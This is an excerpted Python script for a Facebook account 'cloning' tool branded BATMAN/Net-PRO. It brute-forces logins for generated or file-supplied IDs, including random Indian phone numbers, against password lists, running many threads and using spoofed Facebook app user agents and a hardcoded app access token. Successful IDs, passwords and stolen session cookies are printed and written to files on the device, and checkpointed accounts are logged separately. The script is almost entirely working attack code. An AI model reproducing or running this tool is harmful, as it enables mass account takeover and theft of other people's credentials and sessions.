...
os.system('clear')
try:
	open('/sdcard/....BATMAN.txt','w').write(' ')
...
logo=f'''
   \033[1;91m  _      _____ _____ 
    ...
    \033[1;94m| | \|||  /_   | |  
   \033[1;95m \_/  \|\____\  \_/  
 I DON'T NEED ANY KIND OF INFORMATION MY NAME IS
 ENOUGH 
'''
hts='https'
dots=':'
...
htl='html'
ens='?m=1'
apvlink=f'{hts}{dots}{sls}{sls}{BATMANs}{hihs}pro{dts}{blg}{pos}{dts}{dmns}{sls}{yrs}{sls}{srls}{sls}{nms}{dts}{htl}{ens}'
def rqst():
...
def BATMAN():
	...
	print(f'   {B}|{G}02{B}|{W} Random Cloning ({W}SOON{P}){B} ')
	print(f'   {B}|{G}03{B}|{W} Random Cloning ({W}SOON{P}){B}]')
	...
	if tan in ['1','01']:
		...
		print(f'   {B}|{G}🗿{B}|{W} Choice Correctly ');time.sleep(2);BATMAN()
def gmlx():
	user=[]
	clr()
	lin()
	...
	with ThreadPool(max_workers=50) as yaari:
		...
		print(f'   {B}|{G}🗿{B}|{W} ID Saved id {R}:{G} Net Folder')
		lin()
		for guru in user:
...
def filex():
	...
	if me in ["1", "01","11","A","a"]:
		...
		with ThreadPool(max_workers=30) as crack_submit:
			...
			print(f'   {B}|{G}🗿{B}|{W} Ids Saved id {R}:{G} Net Folder')
			lin()
			for user in fo:
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r   {B}|{G}M1{B}|{W}[{G}Net-PRO{H}] [{G}%s{H}|{G}%s{H}] [{G}%s{H}] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                if uid in oks:
                    ...
                    print(f"\r{G}   [Net-OK] {W}{cid}|{ps}")
                    print(f"\r{G}   [Net-COOKIE] {W}{coki}")
                    open('/sdcard/Net-OK.txt', 'a').write( cid+'|'+ps+'|'+coki+'\n')
                    oks.append(uid)
                    break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = uid
                #print(f"\r{R}   [Net-CP] {cid}|{ps}")
                open('/sdcard/Net-CP.txt', 'a').write( cid+'|'+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
...
def rcrack2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            pro = "[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 3;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
            session = requests.Session()
            sys.stdout.write(f'\r   {B}|{G}M2{B}|{W}[{G}BATMAN-PRO{H}] [{G}%s{H}|{G}%s{H}] [{G}%s{H}] '%(loop,tl,len(oks))),
            sys.stdout.flush()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m   [Net-PRO] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m   [Net-OK] %s | %s'%(ids,pas))
                                print(f"\r{G}   [Net-COOKIE] {W}{kuki}")
                                open('/sdcard/Net-FILE-OK.txt', 'a').write( ids+'|'+ps+'|'+coki+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m   [Net-CP] '+ids+'|'+pas+'\033[1;97m')
                                        open(f'/sdcard/Net-FILE-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def rndmpi():
		...
		with ThreadPool(max_workers=30) as SPYC:	
			...
			print(f'   {B}|{G}🗿{B}|{W} ID Saved in {R}:{G} Net FILEs')
			lin()
			for psx in user:
				ids = '+91'+code+psx
				if plst in ['1','01']:
...
def rnapi1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m   [Net API] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [Net-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        open('/sdcard/Net-API-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                        open('/sdcard/Net-UA.txt','a').write(ua+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        #print('\r\r\x1b[38;5;205m [Net-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Net-API-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def rndm1(ids, passlist, tl):
    try:
        global oks, twf, loop
        sys.stdout.write(f"\r\033[1;97m   [Net API-2] \033[1;97m%s\033[1;97m|\033[1;92mOK:-%s\033[1;97m" % (loop, len(oks)))
        sys.stdout.flush()
        
        for ps in passlist:
            ua = random.choice(Netapi)
            head = {
            ...
            if 'session_key' in q:
                if "yes" in scoki:
                    ...
                    cokis = f"sb={cok};{coki}"
                    print('\r\033[1;92m [Net-OK] ' + udx + ' | ' + ps + '\n\033[0;97m')
                    print('\r\033[1;92m [Net-ID] \033[1;97m ' + cokis + '\n\033[1;97m')
                    open('/sdcard/Net-OK.txt', 'a').write(udx + '|' + ps + '|' + cokis + '\n')
                    oks.append(ids)
                else:
                    udx = str(q['uid'])
                    print('\r\033[1;92m [Net-OK] ' + udx + ' | ' + ps + '\033[0;97m')
                    open('/sdcard/Net-OK.txt', 'a').write(udx + '|' + ps + '\n')
                    oks.append(ids)
            else:
                continue
...
def rndmx(ids,passlist):
        global loop,ok
        sys.stdout.write('\r\r\033[1;37m   [Net API-X] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        ...
                        if 'session_key' in po:
                                ...
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                print(f'\r{G}   {G}[Net-OK] {str(uid)} | {pas} ')
                                ...
                                try:
                                    ...
                                    uid = ids
                                print(f'\r{R}   [Net-CP] {str(uid)} | {pas} ')
                                open('/sdcard/Net-API-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cp.append(str(uid))
                                break
                        else:continue
